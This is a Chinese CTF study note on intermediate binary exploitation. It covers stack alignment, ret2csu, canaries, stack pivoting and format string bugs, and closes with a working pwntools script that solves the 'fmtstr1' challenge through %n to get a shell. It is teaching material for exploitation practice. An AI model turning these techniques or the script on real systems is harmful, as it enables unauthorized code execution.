# pwn medium

`更新时间：2025-3-27`

注释解释：

- `<>`必填项，必须在当前位置填写相应数据

- `{}`必选项，必须在当前位置选择一个给出的选项

- `[]`可选项，可以选择填写或忽略

*注：该笔记内的可选项和参数均不完整，如有需要，请查询相关手册*

## 栈对齐

在进行64位攻击的时候，通常需要考虑栈对齐问题，那么，什么是栈对齐？

简单来说，64位的ubuntu系统在调用`system()`函数时，有一个`movaps`的指令，`movaps`指令用于在128位对齐的单精度浮点数向量寄存器或内存之间进行数据传输，能够让计算机同时处理多个浮点数数据，提高数据处理效率。这个指令要求内存地址必须16字节对齐，即程序调用`system()`时，`rsp`指向的地址末位必须是`0`

我们使用一个案例来查看，这个案例没有栈对齐

> <img src="./img0/5.png">

上图中，程序正在执行`system()`函数，但是此时的`rsp`指向地址为`0x7fff80e011a8`，因此最终攻击会报错`Got EOF while reading in interactive`

**如何栈对齐**

栈对齐的方法一般有两种

1. `addr + 1`

`addr + 1`是指将返回地址更改为返回函数的起始位置后一位，因为通常函数的第一位指令都是`push rbp`，这条执行会在栈上写入一个`rbp`，直接跳过这条指令，就能让栈上少8字节，在进行攻击时，栈就会是对齐状态

2. `pop_ret`

对于普通`payload`，例如`payload = flat([cyclic(0x88), callsystem])`，`callsystem`是直接覆盖了子函数的返回地址，这里我们可以直接插入一个`ret`，如`payload = flat([cyclic(0x88), ret, callsystem])`，执行`ret`后，栈上的`callsystem`地址就被弹入了`rip`，然后返回`callsystem`，这样栈上就能少8个字节，栈就会是对齐状态

## ret2csu

`ret2csu`并不是一种题型，而是一种中级`ROP`方法，即在64位题目中，需要给指定函数传递多个参数，而`gadget`又无法满足传参需求，因此需要使用`__libc_csu_init`函数中的某些片段来达到传参的目的

一般来说，需要使用的函数片段为以下两块

**gadget1**

```assembly
.text:00000000004006AA                 pop     rbx
.text:00000000004006AB                 pop     rbp
.text:00000000004006AC                 pop     r12
.text:00000000004006AE                 pop     r13
.text:00000000004006B0                 pop     r14
.text:00000000004006B2                 pop     r15
.text:00000000004006B4                 retn
```

**gadget2**

```assembly
.text:0000000000400690                 mov     rdx, r13
.text:0000000000400693                 mov     rsi, r14
.text:0000000000400696                 mov     edi, r15d
.text:0000000000400699                 call    ds:(__frame_dummy_init_array_entry - 600840h)[r12+rbx*8]
.text:000000000040069D                 add     rbx, 1
.text:00000000004006A1                 cmp     rbx, rbp
.text:00000000004006A4                 jnz     short loc_400690
```

在`gadget2`中可以看到，程序将`r13`的值传递给了`rdx`，将`r14`的值传递给了`rsi`，还将`r15`的低位传递给了`rdi`的低位`edi`，因此，`r13`、`r14`、`r15`均可看作是直接对`rdx`、`rsi`和`rdi`赋值

因此，我们先让程序跳转到`gadget1`的开头位置，然后依次传参，通过`gadget1`的`retn`返回`gadget2`，让`r13`、`r14`、`r15`向`rdx`、`rsi`和`rdi`赋值

然后程序执行`call [r12 + rbx * 8]`，为了让`call`指令能直接跳转到我们想要的函数处，可以直接在`gadget1`中将其设置为0，接着程序继续向下执行，遇到`add rbx, 1`和`cmp rbx, rbp`，此时需要`rbx`的值等于`rbp`的值，程序才能继续执行，上文指出，我们已经将`rbx`的值设置为了0，然后经过`add rbx, 1`后变成了1，只需要将`rbp`也设置为1，就能让程序继续执行

需要注意的是`r12`的内容必须是一个指针，即必须是指向其他地址的地址，因此一般使用`got`表项的地址。如果`r12`不需要调用函数，可以用对栈没有影响的函数代替，比如`__init_array_start`函数

因为`gadget2`位于`gadget1`的低地址，因此程序离开`gadget2`后，又会执行一次`gadget1`，此时所有的赋值都没有任何意义，因此我们直接用垃圾数据填充

```assembly
.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400690                 mov     rdx, r13
.text:0000000000400693                 mov     rsi, r14
.text:0000000000400696                 mov     edi, r15d
.text:0000000000400699                 call    ds:(__frame_dummy_init_array_entry - 600840h)[r12+rbx*8]
.text:000000000040069D                 add     rbx, 1
.text:00000000004006A1                 cmp     rbx, rbp
.text:00000000004006A4                 jnz     short loc_400690
.text:00000000004006A6
.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36↑j
.text:00000000004006A6                 add     rsp, 8
.text:00000000004006AA                 pop     rbx
.text:00000000004006AB                 pop     rbp
.text:00000000004006AC                 pop     r12
.text:00000000004006AE                 pop     r13
.text:00000000004006B0                 pop     r14
.text:00000000004006B2                 pop     r15
.text:00000000004006B4                 retn
```

可以看到从`.text:00000000004006A4`到`.text:00000000004006B4 `之间总共7个地址，因此填充`7 * 8 = 56`字节的垃圾数据，然后填入最后程序返回地址即可

例题见<a href="./pwn_basic_practice.md">`pwn_basic_practice.md`</a>的`level3 amd64`

## Canary

上文中，我们初步认识了`Canary`栈溢出保护措施，这里利用例题深入了解`Canary`的工作机制。我么知道，`Canary`是在栈中存放一个随机数，然后在函数返回时进行检查，正常情况下，栈的内容没有进行任何修改，因此检查通过，程序继续进行。如果进行栈溢出，溢出的数据覆盖了栈中的随机数，那么进行检查时，就能发现栈的内容被修改，从而立即中断程序进行保护

**代码实现**

```assembly
.text:00000000004007F3                 mov     rax, fs:28h
.text:00000000004007FC                 mov     [rsp+128h+var_20], rax
```

第一条指令`mov rax, fs:28h`是将`fs`寄存器偏移`28h`位置的数据传给了`rax`寄存器，第二条指令`mov [rsp+128h+var_20], rax`则是将`rax`的值传递给了`rsp + 128h + var_20`内存地址指向空间的值，这里的缓冲区大小为`128h`，又偏移了`var_20`字节，因此能够作为`Canary`保护程序

在函数返回时，程序会检查`Canary`的值

```assembly
.text:0000000000400882                 mov     rax, [rsp+128h+var_20]
.text:000000000040088A                 xor     rax, fs:28h
.text:0000000000400893                 jnz     short loc_4008A9
```

`mov rax, [rsp+128h+var_20]`将`rsp + 128h + var_20`内存地址指向空间的值传递给`rax`，然后`xor rax, fs:28h`将`rax`与最初的`fs:28h`进行异或操作，`jnz short loc_4008A9`进程判断和跳转操作，`jnz`代表`jump if not z`，`z`是一个标志寄存器中的一个标志位，如果`z`的值为0，这条指令会跳过，如果`z`的值不为0，那么程序会跳转`loc_4008A9`

```assembly
.text:00000000004008A9 loc_4008A9:                             ; CODE XREF: sub_4007E0+B3↑j
.text:00000000004008A9                 call    ___stack_chk_fail
```

这里可以看到`loc_4008A9`是调用了`___stack_chk_fail`函数，抛出栈溢出错误，程序被终止

## 栈迁移

对于之前的一些题目，程序给我们提供了足够大的溢出空间，让我们可以写入`ROP`链，但是有些题目限制了输入长度，因此我们需要栈迁移来将程序执行流（栈）转移到其他地方，如`.bss`段，然后利用`.bss`段已经预先准备好的`gadget`，最终达到攻击的目的

**演示**

假设栈结构

| stack                 | stack pointer  |
| --------------------- | -------------- |
| father function frame |                |
| ---                   |                |
| ret addr              |                |
| ---                   |                |
| previous ebp          |                |
| ---                   | <- current ebp |
| son function frame    |                |
| ---                   | <- current esp |

子函数栈帧中存在栈溢出漏洞，但是向上溢出只能覆盖到`previous ebp`的位置，现在程序正常进行

子函数在调用完成后，执行`leave`，首先执行`mov esp, ebp`

| stack                 | stack pointer                  |
| --------------------- | ------------------------------ |
| father function frame |                                |
| ---                   |                                |
| ret addr              |                                |
| ---                   |                                |
| previous ebp          |                                |
| ---                   | <- current ebp  <- current esp |

然后执行`pop ebp`，将`previous ebp`弹入`current ebp`中

| stack                      | stack pointer  |
| -------------------------- | -------------- |
| grandfather function frame |                |
| ---                        | <- current ebp |
| father function frame      |                |
| ---                        |                |
| ret addr                   |                |
| ---                        | <- current esp |

`leave`执行结束，栈回到了父栈帧，程序只需要执行`ret`即可将`eip`回到父函数

现在假设我们更改了`previous ebp`，将其地址更改为了一块我们准备好攻击指令的地址

程序子函数在调用完成后，执行`leave`，首先执行`mov esp, ebp`

| stack                 | stack pointer                  |
| --------------------- | ------------------------------ |
| father function frame |                                |
| ---                   |                                |
| ret addr              |                                |
| ---                   |                                |
| attack addr           |                                |
| ---                   | <- current ebp  <- current esp |

因为我们将`previous ebp`改为了`attack addr`，因此`pop ebp`后，`ebp`被迁移到了`attack addr`

| stack             | stack pointer  | attack addr    | attack pointer |
| ----------------- | -------------- | -------------- | -------------- |
| father func frame |                | attack command |                |
| ---               |                | attack command |                |
| ret addr          |                | attack command |                |
| ---               | <- current esp | ---            | <- current ebp |

然后程序执行`ret`，即`pop eip`，程序返回父函数

| stack                  | stack pointer  | attack addr    | attack pointer |
| ---------------------- | -------------- | -------------- | -------------- |
| ---                    |                | attack command |                |
| grandfather func frame |                | attack command |                |
| ---                    |                | attack command |                |
| father func frame      |                | attack command |                |
| ---                    | <- current esp | attack command |                |
| ret addr               |                | attack command |                |
| ---                    |                | ---            | <- current ebp |

在程序执行完成父函数后，准备返回爷函数

| stack             | stack pointer  | attack addr    | attack pointer |
| ----------------- | -------------- | -------------- | -------------- |
| ---               |                | attack command |                |
| father's ret addr |                | attack command |                |
| ---               |                | attack command |                |
| grandfather's ebp |                | attack command |                |
| ---               | <- current esp | attack command |                |
| father func frame |                | attack command |                |
| ---               |                | ---            | <- current ebp |

此时再次执行`leave`，即`mov esp, ebp`，又因为此时`ebp`位于`attack addr`，因此栈即被迁移到了`attack addr`

| stack             | stack pointer | attack addr    | attack pointer                |
| ----------------- | ------------- | -------------- | ----------------------------- |
| ---               |               | attack command |                               |
| father's ret addr |               | attack command |                               |
| ---               |               | attack command |                               |
| grandfather's ebp |               | attack command |                               |
| ---               |               | attack command |                               |
| father func frame |               | attack command |                               |
| ---               |               | ---            | <- current ebp <- current esp |

因为程序根据`esp`和`ebp`来分辨栈，所以`pop ebp`指令，被`pop`的数据将会是`attack addr`栈上的内容，此时就达到了攻击目的

根据演示其实可以知道，如果需要进行栈迁移，其实需要两次`leave`指令，第一次迁移`ebp`，第二次迁移`esp`

## 格式化字符串

对于如下C代码

```c
#include <stdio.h>

int main() {
    char s[100];
    int a = 1, b = 0x22222222, c = -1;
    scanf("%s", s);
    printf("%08x %08x %08x %s\n", a, b, c, s);
    printf(s);
    
    return 0;
}
```

运行后能得到如下结果

> <img src="./img0/17.png">

`printf()`函数是C语言中常见的输出函数，可以有多个参数，第一个参数一般是格式化字符串，规定了`printf()`函数的输出格式。格式化字符串使用`%`来表示占位符，说明此处是一个变量的内容，如`%d`表示此处是一个十进制整型，`%f`表示此处是一个浮点数等，然后从第二个参数开始，按照顺序读取对应的值

### 格式化字符串漏洞

现在来假设一种情况，如果`printf()`的格式化字符串后没有对应的参数

```c
#include <stdio.h>
#include <unistd.h>

int main() {
	char str[100];
	read(1, str, 100);
    printf(str);

    return 0;
}
```

然后编译并运行程序

> <img src="./img0/22.png">

可以看到，程序依然输出了一些内容，这些内容从何而来？

现在我们来调试这个程序，注意需要编译为32位，因为64位通过寄存器传参

在`main()`处断点，然后步过并输入`%p.%p.%p.%p`，在程序打印后查看栈

> <img src="./img0/21.png">

图中可以看出，打印的内容正好是栈上存放的内容，也就是说，如果我们在格式化字符串后不提供任何参数，程序在调用`printf()`函数时，依然会依据格式化字符串的占位符，在栈上寻找相应的参数

如上图中，`esp`存放的是`printf()`的第一个参数，`esp + 4`存放的也是`printf()`的第一个参数，即格式化字符串，`esp + 8`存放的是`printf()`的第二个参数，格式化字符串读取的第一参数`0x64`

利用这个特性，如果栈上存在一些敏感信息，如`Canary`，`flag`等，就可以直接通过格式化字符串漏洞进行泄露

**X$**

假设如下C代码

```c
#include <stdio.h>
#include <unistd.h>

int main() {
	char str[10];
	read(1, str, 10);
    printf(str);

    return 0;
}
```

`str`的长度只有10，如果此时栈上的敏感内容位于`printf()`函数的上方超过10个字节的地址，那么正常传入`"%p%p%p..."`就无法达到需要泄露的位置

我们需要利用格式化字符串的另一种写法`X$`

`X$`指的是格式化字符串可以指定此处显示的值的参数顺序，如`%3$d`，表示格式化后方的第三个整型参数。那么，上文所述的情况下，就能够传入`%20$p`或其他数值，来精确获取敏感内容

**%n**

在C语言格式化字符串的占位符中，存在一个占位符`%n`，其意义是获取已打印字符的个数，并赋值给对应的参数，参数必须是一个地址，否则程序运行时会报错

```c
#include <stdio.h>

int main() {
	int a, b;

    printf("This is a%n example!%n\n", &a, &b);
    printf("a = %d\nb = %d\n", a, b);

    return 0;
}
```

运行结果

> <img src="./img0/20.png">

在上文中我们知道，在不指定第二参数的情况下，`printf()`会将栈上的内容作为第二参数依次读取，如果此时我们将格式化字符串写为一个地址，并使用`%n`为其写入数据，理论上就能实现在栈上的任意位置写入数据

### fmtstr1

先进行反编译

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[80]; // [esp+2Ch] [ebp-5Ch] BYREF
  unsigned int v5; // [esp+7Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  be_nice_to_people();
  memset(buf, 0, sizeof(buf));
  read(0, buf, 0x50u);
  printf(buf);
  printf("%d!\n", x);
  if ( x == 4 )
  {
    puts("running sh...");
    system("/bin/sh");
  }
  return 0;
}
```

第15行直接调用了`shell`，其调用条件是变量`x == 4`，而又因为存在`printf(buf)`，所以这道题很明显存在格式化字符串漏洞，只需要通过`printf(buf)`将变量`x`的值改为4即可

先确认变量`x`的位置

> <img src="./img0/23.png">

变量`x`位于`.data`段上，默认值是3

然后进行动态调试，计算`printf()`与`buf`之间的距离

> <img src="./img0/24.png">

如图，`esp`是`printf()`的格式化字符串位置，`esp + 4`是其拷贝，`ebx`是`buf`的位置，中间距离11个字长，所以如果我们想要更改x的值，首先需要传入x的地址，此时x的地址就会存放在`ebx`的位置，然后拼接一个`%11$n`来让`printf()`的格式化字符串寻找第11个参数，即x的地址，然后为其赋值

构造攻击脚本

```py
from pwn import *

sh = process('./fmtstr1')
# 本题需要让x的值等于4，而x的地址本身就是四字节，因此直接拼接即可
payload = p32(0x804a02c) + b'%11$n'
sh.sendline(payload)
sh.interactive()
```

此时的栈结构为

| stack addr | content                 |
| ---------- | ----------------------- |
| 0xffffcef0 | &p32(x addr) + b'%11$n' |
| 0xffffcef4 | &p32(x addr) + b'%11$n' |
| 0xffffcef8 | 0x50                    |
| 0xffffcefc | 1                       |
| 0xffffcf00 | 0                       |
| 0xffffcf04 | 1                       |
| 0xffffcf08 | &0                      |
| 0xffffcf0c | &0x6d6f682f             |
| 0xffffcf10 | 0                       |
| 0xffffcf14 | &0x5b94e1bb             |
| 0xffffcf18 | 0x1a                    |
| 0xffffcf1c | x addr                  |

执行脚本，成功`getshell`

> <img src="./img0/25.png">
